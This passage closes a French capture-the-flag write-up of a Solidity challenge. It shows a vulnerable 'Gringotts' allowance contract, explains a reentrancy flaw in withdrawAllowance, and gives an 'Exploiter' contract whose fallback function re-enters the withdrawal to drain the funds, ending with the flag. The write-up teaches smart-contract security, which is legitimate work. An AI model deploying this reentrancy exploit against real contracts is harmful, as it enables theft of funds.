+</span></span><span class=line><span class=cl>        alreadyWithdrawn = false;
+</span></span><span class=line><span class=cl>        _;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function withdrawAllowance() external isEligible{
+</span></span><span class=line><span class=cl>        require(alreadyWithdrawn == false);
+</span></span><span class=line><span class=cl>        if(availableAllowance &gt;= allowancePerYear){
+</span></span><span class=line><span class=cl>         if (msg.sender.call.value(allowancePerYear)()){
+</span></span><span class=line><span class=cl>            alreadyWithdrawn = true;
+</span></span><span class=line><span class=cl>         }
+</span></span><span class=line><span class=cl>        numberOfWithdrawls = numberOfWithdrawls + 1;
+</span></span><span class=line><span class=cl>        sorceryAllowance[msg.sender]-= allowancePerYear;
+</span></span><span class=line><span class=cl>        availableAllowance-=allowancePerYear;
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  function donateToSorcery(address sorceryDestination) payable public{
+</span></span><span class=line><span class=cl>    sorceryAllowance[sorceryDestination] += msg.value;
+</span></span><span class=line><span class=cl>  }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  function queryCreditOfSorcery(address sorcerySource) view public returns(uint){
+</span></span><span class=line><span class=cl>    return sorceryAllowance[sorcerySource];
+</span></span><span class=line><span class=cl>  }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>On remarque que la vulnérabilité va sûrement se retrouver dans la fonction <code>withdrawAllowance()</code>. En effet, les fonctions <code>donateToSorcery</code> et <code>queryCreditOfSorcery</code> ne font rien de très foufou. En regardant le constructeur, on remarque l&rsquo;allowance par an est de <code>msg.value/10</code>.</p><p>L&rsquo;objectif ici va tout simplement être de s&rsquo;octroyer le maximum d&rsquo;allowance que le contrat a. C&rsquo;est à dire <code>availableAllowance = msg.value;</code> décrit dans le constructeur, en évitant bien sûr d&rsquo;attendre 10 ans avant de tout récupérer.</p><p>Pour cela, on va effectuer une attaque de type Reentrancy. Ci-dessous un peu de documentation pour savoir comment ça marche:</p><ul><li><a href=https://hackernoon.com/smart-contract-security-part-1-reentrancy-attacks-ddb3b2429302 target=_blank rel="noopener noreffer">https://hackernoon.com/smart-contract-security-part-1-reentrancy-attacks-ddb3b2429302</a></li><li><a href=https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4 target=_blank rel="noopener noreffer">https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4</a></li></ul><h3 id=exploitation-de-la-reentrancy>Exploitation de la Reentrancy</h3><p>Cette attaque de type reentrancy consiste donc à exécuter la commande <code>msg.sender.call.value(allowancePerYear)()</code> en boucle jusqu&rsquo;à mettre à 0 la variable <code>availableAllowance</code>. La commande étant un appel externe, la variable <code>alreadyWithdrawn</code> n&rsquo;aura pas le temps de se mettre à <code>true</code>, nous permettant ainsi de vider le contrat.</p><p>Pour réaliser cette attaque, on va utiliser le contrat suivant:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> contract Exploiter {
+</span></span><span class=line><span class=cl>    address public challenge3Contract = 0x3C81bC083C26cbeEc62181EA9b4A5933a02eE22b;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    constructor() public payable {
+</span></span><span class=line><span class=cl>        Gringotts contractChallenge3 = Gringotts(challenge3Contract);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>     
+</span></span><span class=line><span class=cl>    function Exploit() public payable {
+</span></span><span class=line><span class=cl>        contractChallenge3.withdrawAllowance();
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>     
+</span></span><span class=line><span class=cl>    function () public payable {
+</span></span><span class=line><span class=cl>        contractChallenge3.withdrawAllowance();
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>     
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>Ce contrat va nous permettre d&rsquo;appeler une première fois la fonction vulnérable. Lorsque nous arrivons à l&rsquo;instruction <code>msg.sender.call.value(allowancePerYear)()</code>, la fonction de fallback (fonction sans nom dans notre contrat Exploiter) va entrer en jeu.</p><p>En effet, l&rsquo;instruction <code>msg.sender.call.value(allowancePerYear)()</code> va envoyer de l&rsquo;ether du contrat vulnérable à notre contrat malicieux. Il faut savoir que la fonction de fallback est exécutée à chaque fois que le contrat reçoit de l&rsquo;ether. Donc à chaque fois que <code>msg.sender.call.value(allowancePerYear)()</code> sera exécuté, la fonction de fallback sera exécuté, créant une boucle infini jusqu&rsquo;au vidage du contrat.</p><p>Une fois la fonction Exploit() exécutée, il nous suffit just de récupérer le flag via l&rsquo;interface.</p><h3 id=le-flag>Le flag</h3><blockquote><p>Well done ! SANTA{R3eN7r4ncY_f0r_Th3_WiN}</p></blockquote></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>
